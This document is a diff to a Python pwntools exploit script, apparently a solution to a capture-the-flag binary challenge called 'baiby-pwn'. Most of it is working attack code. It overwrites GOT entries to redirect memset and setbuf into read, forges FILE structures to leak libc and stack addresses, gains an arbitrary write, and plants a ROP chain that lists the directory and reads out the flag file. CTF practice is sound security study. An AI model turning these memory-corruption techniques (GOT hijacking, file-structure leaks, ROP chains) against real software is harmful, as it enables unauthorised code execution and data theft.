@@ -26,14 +26,15 @@ vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
 chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]
 
 GDB_SCRIPT = """
-
+b *main+190 
+c
+printf "RSP:%p\\n", $rsp
 """
 
 if args.GDB:
     r = process(e.path, stderr=subprocess.STDOUT)
     gdb.attach(r, gdbscript=GDB_SCRIPT)
 elif args.LOCAL:
-	# redirect stderr->stdout so the exit-flush leak (fd2) lands on the tube
 	r = process(["sh", "-c", f"exec {e.path} 2>&1"])
 elif args.DOCKER:
     # run container with sudo docker run --rm --privileged -p 5000:5000 pwnchall
@@ -82,13 +83,14 @@ gadgets:
 call_read:
 ➜  baiby-pwn objdump -d ./baiby-pwn_patched | grep "call.*4010b0"                            
   4011ea:	e8 c1 fe ff ff       	call   4010b0 <read@plt>
-➜  baiby-pwn objdump -d ./baiby-pwn_patched | grep -b5 "call.*4010b0"
 
+➜  baiby-pwn objdump -d ./baiby-pwn_patched | grep -b5 "call.*4010b0"
 # ...
 7056-  4011e2:	48 89 c6             	mov    %rax,%rsi
 7105-  4011e5:	bf 00 00 00 00       	mov    $0x0,%edi
 7154:  4011ea:	e8 c1 fe ff ff       	call   4010b0 <read@plt>
-# ...
+
+
 
 load_stdout:
 objdump -d ./baiby-pwn_patched | grep -b5 "call.*401090"
@@ -116,11 +118,11 @@ objdump -d ./baiby-pwn_patched | grep -b5 "call.*401090"
 
 call_read = 0x4011e2 # mov rsi, rax; mov edi, 0; call read@plt
 load_stdout = 0x401231 # mov rax, [stdout]; mov esi, 0; mov rdi, rax; rdi = &_IO_2_1_stdout_; call setbuf@plt
-load_stdin = 0x401216
+load_stdin = 0x40121d
 
 stdout_ptr = 0x404040
 stdin_ptr = stdout_ptr + 0x10 
-sterr_ptr = stdin_ptr + 0x10
+stderr_ptr = stdin_ptr + 0x10
 
 
 """
@@ -151,8 +153,9 @@ def leak():
 
     option_1(e.got.memset, load_stdout) # memset -> loads stdout , calls setbuf
     option_1(e.got.setbuf, call_read) # setbuf -> read(0, rax, rdx)
-
-    option_2() # expects input 
+    
+    option_2() # expects input (overwrite file structure -> leak)
+    # r.interactive()
 
     """ 
     got: 
@@ -176,42 +179,306 @@ def leak():
 
     """
     fs = FileStructure()
-    fs.flags = 0xFBAD1800
+    fs.flags = 0xFBAD1800 # flags with IO_CURRENTLY_PUTTING and IO_IS_APPENDING = 1 
     fs._IO_write_base = 0x404000
     fs._IO_write_ptr = 0x404068
     fs._IO_write_end = 0x404068
-    payload = bytes(fs)[:0x68]
-    sn(payload) 
+    
+    # by default pwntools sets _IO_read_end = 0 -> in this case _IO_write_base - _IO_read_end > 0 -> ok! no blocking errors on the socket
 
-    # i have the leak!!
 
-    # restore got.setbuf to its normal value
-    option_1(e.got.setbuf, e.plt.setbuf)
-    # option_2() 
-    leaked = r.recvn(0x68, timeout=8)
+    payload = bytes(fs)[:0x40] # payload size = 0x40 because memset has the size = sizeof(arr) = 0x40
+    sn(payload) # send payload to the read i triggered 
 
+    # restore got.setbuf to its previos valid value, otherrwise program will crash and not flush correctly
+    option_1(e.got.setbuf, 0x401040)
+    
+    option_2() # call memset
+    leaked = r.recvn(0x68) # i have the leak!!
+    
     atol = u64(leaked[0x20:0x28])
     aleak('atol', atol)
-    libc.addr = atol - 0x46680
-    aleak('libc', libc.addr)
+    libc.address = atol - 0x46680
+    aleak('libc', libc.address)
     
     stdout = u64(leaked[0x40:0x48])
     stderr = u64(leaked[0x60:0x68])
 
+    aleak('stdout', stdout)
+    aleak('stderr', stderr)
+    # r.interactive()
+
     return
 
-# TODO: arb write
-arb_write(addr, data):
-    for off in range(0, len(data), 0x40):
 
+
+# arb write
+
+""" 
+i need to write a rop chain on the stack
+problem: i can write an idx <= 99999 -> can't reach libc/stack 
+idea: overwrite got entries so that read is called and i can write a payload where i want
+
+got.memset = load stdin, got.setbuf = target 
+so: option_2 -> memset -> load stdin -> calls setbuf -> read! (write rop chain to target)
+
+target is a stack address so I need to leak it from libc.environ
+
+"""
+
+
+def leak_stack():
+    pause()
+    print("leaking stack") 
+    
+    option_1(e.got.memset, load_stdout) # memset -> loads stdout , calls setbuf
+    option_1(e.got.setbuf, call_read) # setbuf -> read(0, rax, rdx)
+    option_2() # trigger read
+    # r.interactive()
+    
+    fs = FileStructure()
+    fs.flags = 0xFBAD0800 # flags with IO_CURRENTLY_PUTTING = 1 and IO_IS_APPENDING = 0 (to avoid seek being called and crashing since we are communicating with pipes) 
+
+    # by default pwntools sets _IO_read_end = 0 -> but libc.environ is a huge negative value -> lseek crashes with critical error
+    # fix: set write base == read end to avoid output corruption
+    fs._IO_write_base = libc.sym.environ
+    fs._IO_read_end = libc.sym.environ 
+    fs._IO_write_ptr = libc.sym.environ + 0x8
+    fs._IO_write_end = libc.sym.environ + 0x8
+    payload = bytes(fs)[:0x40]
+
+    sn(payload)
+    print(hex(libc.sym.setbuf))
+    option_1(e.got.setbuf, 0x401040)
+    option_2()
+
+    # r.interactive()
+    stack = u64(r.recvn(0x8))
+    aleak('stack leak', stack)
+    
+
+
+     # use the arb read to dump stack addresses and find rip (where we will write the rop chain)
+    window_size = 0x1000
+    window_low = stack - window_size
+    option_1(e.got.memset, load_stdout)
+    option_1(e.got.setbuf, call_read)
+    option_2()
+
+    fs = FileStructure()
+    fs.flags = 0xFBAD1800
+    fs._IO_write_base = window_low
+    fs._IO_write_ptr = window_low + window_size
+    fs._IO_write_end = window_low + window_size
+    fs._IO_read_end = 0
+    sn(bytes(fs)[:0x40])
+
+    option_1(e.got.setbuf, 0x401040) # restore setbuf to its correct value
+    option_2()
+
+    data = r.recvn(window_size)
+    target = libc.address + 0x2A1CA # search addresses around libc_start_main
+    
+    for off in range(0, len(data) - 8, 8):
+        v = u64(data[off:off+8])
+        if target - 0x100 <= v < target + 0x100:
+            ret_slot = window_low + off
+            aleak('stack target', ret_slot)
+            return ret_slot
+
+    raise Exception("rip not found")
+
+  
+
+
+def solve(stack):
+
+    # write current directory path in arr (.bss)
+    cur_dir = u64(b".\0\0\0\0\0\0\0") if args.LOCAL or args.GDB else u64(b"/\0\0\0\0\0\0\0")
+
+    option_1(e.sym.arr, cur_dir)                        
+    
+    # i can write a rop chain into stack
+    # file name is flag{random}.txt 
+    # do getdens on current directory -> list files -> read to get the filename from the input -> open, read, write of the file
+    
+    pop_rdi = libc.address +  0x10f78b
+    pop_rsi = libc.address + 0x110a7d
+    pop_rbx = libc.address + 0x586e4
+    rop = ROP(libc)
+    rop.open(e.sym.arr, 0) # open directory
+    
+    # list directory files with getdents64
+
+    # avoid 0x0x404040 - 0x404070 where stdin/out/err ptrs are stored
+    list_buf = 0x404300
+    name_buf = 0x404300 + 0x400
+
+    # no directs gadget in libc to set rdx (such a pain)
+    set_rdx = libc.address + 0xb0153 # mov rdx, rbx; pop rbx; pop r12; pop rbp; ret;
+    # rop.rbx = 0x400
+    rop.raw(pop_rbx)
+    rop.raw(0x400)
+
+    rop.raw(set_rdx)
+    rop.raw(0x0) # filler for rbx
+    rop.raw(0x0) # filler r12 
+    rop.raw(0x0) # filler rbp
+
+    rop.raw(pop_rdi)
+    rop.raw(3)
+    # rop.rsi = e.sym.arr
+    rop.raw(pop_rsi)
+    rop.raw(list_buf)
+
+    rop.raw(libc.sym.getdents64) # getdents64(3, arr (= current directory), 0x400)
+    
+    # print files list
+    rop.raw(pop_rbx)
+    rop.raw(0x400)
+    rop.raw(set_rdx)
+    rop.raw(0x0)
+    rop.raw(0x0)
+    rop.raw(0x0)
+    rop.raw(pop_rdi)
+    rop.raw(1)
+    rop.raw(pop_rsi)
+    rop.raw(list_buf)
+    rop.raw(libc.sym.write)
+
+
+    # read flag file name
+    # rop.rbx = 0x10
+    rop.raw(pop_rbx)
+    rop.raw(0x50)
+
+    rop.raw(set_rdx)
+    rop.raw(0x0) # filler for rbx
+    rop.raw(0x0) # filler r12 
+    rop.raw(0x0) # filler rbp
+    
+    rop.raw(pop_rdi)
+    rop.raw(0) # read from stdin
+
+    aleak('name buffer', name_buf)
+    rop.raw(pop_rsi)
+    rop.raw(name_buf)
+    rop.raw(libc.sym.read) # read(0, name_buf, 0x50)
+    
+    # open(name_buf, 0)
+    rop.raw(pop_rdi)
+    rop.raw(name_buf)
+    rop.raw(pop_rsi)
+    rop.raw(0)
+    rop.raw(libc.sym.open)
+    
+   
+    # read flag file content
+    log.info('read2')
+    rop.raw(pop_rbx)
+    rop.raw(0x100)
+
+    rop.raw(set_rdx)
+    rop.raw(0x0) # filler for rbx
+    rop.raw(0x0) # filler r12 
+    rop.raw(0x0) # filler rbp
+    rop.raw(pop_rdi)
+    rop.raw(4) # fd
+
+    rop.raw(pop_rsi)
+    rop.raw(name_buf)
+    rop.raw(libc.sym.read) # read(3, addr, 0x100)
+
+
+    # print flag
+    # rop.rbx = 0x100
+    rop.raw(pop_rbx)
+    rop.raw(0x100)
+
+    rop.raw(set_rdx)
+    rop.raw(0x0) # filler for rbx
+    rop.raw(0x0) # filler r12 
+    rop.raw(0x0) # filler rbp
+    rop.raw(pop_rdi)
+    rop.raw(1)
+
+    rop.raw(pop_rsi)
+    rop.raw(name_buf)
+    rop.raw(libc.sym.write) # write(1, addr, 0x100)
+ 
+
+    payload = rop.chain()
+    # print(rop.dump())
+
+    # i can't write > 0x40 bytes at a time (arr has size 0x40)
+    for i in range(0, len(payload), 0x40):
+        block = payload[i:i+0x40]
+        write_rop(stack + i, block)
+
+    return 
+
+
+def write_rop(stack, block):
+    # i can't write stack address in memory with option_1 :( they are too long
+
+    """
+    in bss there is:
+    0x404040: stdout_ptr
+    0x404050: stdin_ptr
+    0x404060: stderr_ptr
+    """
+
+    # so i use my arb write to write the stack addr into stdinptr @ 0x404050
+    
+    # write a stack address by self referencing stdout and writing directly there (it will be the 'buffer' argument of the read)
+    option_1(stdout_ptr, stdout_ptr) # *stdout_ptr = stdout_ptr
+    option_1(e.got.memset,load_stdout) # rax = *stdout_ptr = stdout_ptr
+    option_1(e.got.setbuf, call_read)
+    option_2()
+                                                            
+
+    set_stack = flat({
+        0x00: libc.sym.stdout,
+        0x10: stack, # overwrite stdin_ptr
+        0x20: libc.sym.stderr
+    })
+    r.send(set_stack.ljust(0x40, b"\x00"))
+     # now the next read will read from stdin -> stack
+
+    option_1(e.got.memset, load_stdin) # rax = *stdin_ptr = stack
+    option_1(e.got.setbuf, call_read)
+    option_2()
+    sn(block.ljust(0x40, b'\x00'))
 
 
 
 def main():
 
     leak()
-    r.interactive()
+    stack_target = leak_stack()
+    solve(stack_target)
+    sn(pack(9))
 
+    if args.GDB:
+        log.info("if in gdb: cmd continue.\npress enter:")
+        input()
+
+    
+    listing = r.recvrepeat(timeout=5)
+    log.info("folder content bytes:")
+    print(repr(listing)) # print folder content bytes
+    pause()
+    match = re.search(rb"(flag[-\w.]*\.txt)", listing)
+    if not match:
+        log.failure("flag file not found")
+        exit(1)
+
+    flag_name = match.group(1)
+    path = flag_name if args.LOCAL or args.GDB else b"/" + flag_name
+    log.success(f"found: {path.decode()}")
+
+    sn(path.ljust(0x50, b"\x00"))
+    r.interactive()
 
 if __name__ == "__main__":
 	main()
